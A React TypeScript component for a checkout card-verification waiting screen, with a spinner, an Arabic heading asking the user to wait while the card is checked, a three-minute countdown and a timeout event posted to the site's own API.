import { useEffect, useState } from 'react';
import { Loader2, Clock } from 'lucide-react';
import { postCheckoutEvent } from '@/lib/api';

interface CardApprovalProps {
  sessionId?: string;
  orderId?: string;
}

const CardApproval = ({ sessionId, orderId }: CardApprovalProps) => {
  const [timer, setTimer] = useState(180);

  useEffect(() => {
    if (timer > 0) {
      const timeout = setTimeout(() => setTimer(timer - 1), 1000);
      return () => clearTimeout(timeout);
    } else {
      if (sessionId) {
        postCheckoutEvent({
          sessionId,
          eventType: 'approval_timeout',
          timestamp: new Date().toISOString(),
        }).catch(() => {});
      }
    }
  }, [timer, sessionId]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const isLowTime = timer <= 30;

  return (
    <div className="bg-white rounded-2xl border border-gray-200 p-10 text-center shadow-sm max-w-md mx-auto">
      <div className="w-24 h-24 rounded-full bg-blue-50 mx-auto mb-6 flex items-center justify-center">
        <div className="relative">
          <Loader2 className="h-12 w-12 text-blue-500 animate-spin" />
        </div>
      </div>

      <h2 className="text-2xl font-bold text-gray-900 mb-6">انتظر للتأكد من صحة البطاقة</h2>

      <div
        className={`inline-flex items-center gap-2 px-4 py-2 rounded-full ${
          isLowTime ? 'bg-red-50 text-red-600' : 'bg-gray-50 text-gray-600'
        } mb-6`}
      >
        <Clock className={`h-5 w-5 ${isLowTime ? 'text-red-500' : 'text-gray-400'}`} />
        <span className="font-mono text-lg font-semibold">{formatTimer(timer)}</span>
      </div>

      {sessionId && (
        <div className="bg-gray-50 rounded-xl p-4">
          <div className="flex justify-between text-sm">
            <span className="text-gray-400">معرف العملية</span>
            <span className="font-mono text-gray-600 text-xs">{sessionId.slice(0, 12)}...</span>
          </div>
        </div>
      )}
    </div>
  );
};

export default CardApproval;
